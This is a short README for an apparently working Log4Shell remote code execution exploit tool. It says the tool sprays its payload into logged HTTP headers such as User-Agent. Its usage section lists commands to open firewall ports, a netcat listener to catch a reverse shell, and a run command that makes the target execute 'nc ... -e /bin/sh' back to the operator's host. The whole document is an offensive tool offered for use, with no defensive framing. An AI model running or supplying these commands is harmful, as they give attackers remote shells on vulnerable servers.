## Log4Shell RCE Exploit 

[![asciicast](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj.svg)](https://asciinema.org/a/BSuuPRF6HXTe8rgReFmFIzvtj)

fully independent exploit does not require any 3rd party binaries.
The exploit spraying the payload to all possible logged HTTP Headers such as `X-Forwarding , Server-IP , User-Agent` 
### Usage
open firewall ports
```ufw enable
ufw allow <netcat port>/tcp
ufw allow 1389/tcp
ufw allow <http_port>/tcp
ufw reload
```

reverse shell receiver
```
nc -lvp <port>
```

exploit execution
```shell
python main.py -i lhost -u http://target:targetport -c "nc <domain|ip> <port> -e /bin/sh" -p lhttp_port -l lldap_port
 ```


### Requirements 
- java-8-openjdk
- pip install -r requirements.txt
- python3.6+
